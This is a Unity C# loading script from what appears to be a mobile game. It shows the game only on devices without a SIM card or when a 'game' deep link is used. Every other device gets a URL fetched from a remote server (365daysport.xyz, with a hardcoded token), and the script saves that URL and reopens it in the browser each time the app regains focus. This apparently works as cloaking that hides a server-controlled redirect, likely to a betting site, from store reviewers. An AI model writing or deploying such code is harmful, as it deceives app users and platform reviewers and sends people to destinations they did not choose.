using System;
using System.Collections;
using System.Net;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class Loading : MonoBehaviour
{
    private string JsonUrl
    {
        get => "https://365daysport.xyz/api.php?token=66c467594ea5dee6edc697f0367e4244";
    }

    private string HomeString
    {
        get => PlayerPrefs.GetString("homestring", "home");
        set => PlayerPrefs.SetString("homestring", value);
    }

    private IEnumerator Start()
    {
        while(!TapToStart.isPressing)
        {
            yield return null;
        }

        if (!CheckForInternetConnection())
        {
            NoInet.Instant();
            yield break;
        }

        if (!Simcard.Sim_Enable)
        {
            SceneManager.LoadScene(1);
            yield break;
        }

        Application.deepLinkActivated += OnDeepLinkActivated;
        if (!string.IsNullOrEmpty(Application.absoluteURL))
        {
            OnDeepLinkActivated(Application.absoluteURL);
            yield break;
        }

        if (HomeString.Length > 4)
        {
            Application.OpenURL(HomeString);
            yield break;
        }

        Spinner.Instant();
        StartCoroutine(GetJsonData((responce) =>
        {
            var data = JsonBody.Data(responce.Substring(1, responce.Length - 2));
            Application.OpenURL(HomeString = data.url);
        }));
    }

    private void OnDeepLinkActivated(string url)
    {
        if (url.Contains("game"))
        {
            SceneManager.LoadScene(1);
            return;
        }
    }

    private void OnApplicationFocus(bool focus)
    {
        if (TapToStart.isPressing && focus && string.IsNullOrEmpty(Application.absoluteURL))
        {
            Application.OpenURL(HomeString);
        }
    }

    private bool CheckForInternetConnection()
    {
        try
        {
            var client = new WebClient();
            using (client.OpenRead("http://unity3d.com"))
            {
                return true;
            }
        }
        catch
        {
            return false;
        }
    }

    private IEnumerator GetJsonData(Action<string> OnFinishChecking)
    {
        var request = UnityWebRequest.Get(JsonUrl);
        yield return request.SendWebRequest();

        var ansver = request.downloadHandler.text;
        OnFinishChecking?.Invoke(ansver);
    }

    [Serializable]
    private class JsonBody
    {
        public string description;
        public string button;
        public string url;
        public string img_logo;

        public static JsonBody Data(string responce)
        {
            return JsonUtility.FromJson<JsonBody>(responce);
        }
    }
}
